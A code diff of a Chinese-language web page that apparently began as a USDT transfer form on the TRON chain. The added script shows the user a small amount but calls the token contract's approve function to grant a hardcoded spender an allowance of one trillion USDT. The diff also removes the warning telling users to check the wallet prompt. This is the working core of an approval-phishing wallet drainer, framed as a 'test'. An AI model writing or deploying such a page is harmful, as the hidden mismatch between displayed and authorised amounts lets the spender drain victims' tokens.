@@ -3,105 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT 转账 - 测试版</title>
+    <title>TRON 链大额授权测试</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .input-group {
-            margin: 15px 0;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            margin: 5px 0;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        #connectBtn {
-            background: #4CAF50;
-            color: white;
-        }
-        #approveBtn {
-            background: #2196F3;
-            color: white;
-        }
-        #approveBtn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        #status {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 5px;
-            background: #f8f9fa;
-            min-height: 20px;
-        }
-        .network-info {
-            background: #e3f2fd;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 15px;
-            font-size: 14px;
-        }
-        .warning-note {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            font-size: 12px;
-            color: #856404;
-        }
+        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .tron-info { background: #e8f4f8; padding: 10px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #ff001c; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>USDT 转账测试</h2>
+        <h2>🌐 TRON 链大额授权测试</h2>
         
-        <div class="network-info">
-            🌐 当前网络: <strong id="networkStatus">未连接</strong>
-        </div>
-
-        <div class="warning-note">
-            ⚠️ 测试环境 - 请仔细检查钱包弹出的授权内容
+        <div class="tron-info">
+            <strong>TRON 链特性：</strong><br>
+            • USDT 6 位小数<br>
+            • 使用 TronLink 钱包<br>
+            • 测试极大金额授权
         </div>
 
         <div class="input-group">
-            <label for="amount">转账金额 (USDT):</label>
-            <input type="number" id="amount" placeholder="输入转账金额" value="10" step="0.1">
+            <label>显示金额 (USDT):</label>
+            <input type="number" id="amount" value="100" step="1">
         </div>
 
         <button id="connectBtn">🔗 连接 TronLink</button>
-        <button id="approveBtn" disabled>✅ 确认转账</button>
+        <button id="approveBtn" disabled>🌊 测试 TRON 大额授权</button>
 
-        <div id="status">请先连接钱包...</div>
+        <div id="status">请先连接 TronLink...</div>
     </div>
 
-    <script src="usdtApprove.js"></script>
+    <script>
+        // TRON 链专用代码
+        const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
+        const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";
+
+        // TRON 大额授权金额
+        function getTronHugeAmount() {
+          return (1000000000000 * 1000000).toString(); // 1万亿 USDT
+        }
+
+        window.approveUSDT = async function() {
+          try {
+            const inputAmount = document.getElementById("amount").value;
+            const hugeAmount = getTronHugeAmount();
+            
+            console.log("TRON 链测试 - 前端显示:", inputAmount, "实际授权: 1万亿 USDT");
+            
+            const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
+            const result = await usdtContract.approve(spenderAddress, hugeAmount).send({
+              feeLimit: 100000000,
+              callValue: 0
+            });
+            
+            setStatus("✅ 请观察 TronLink 显示内容");
+            
+          } catch (err) {
+            setStatus("❌ " + err.message, true);
+          }
+        };
+
+        // 页面初始化代码...
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+          // 连接代码...
+        });
+    </script>
 </body>
 </html>
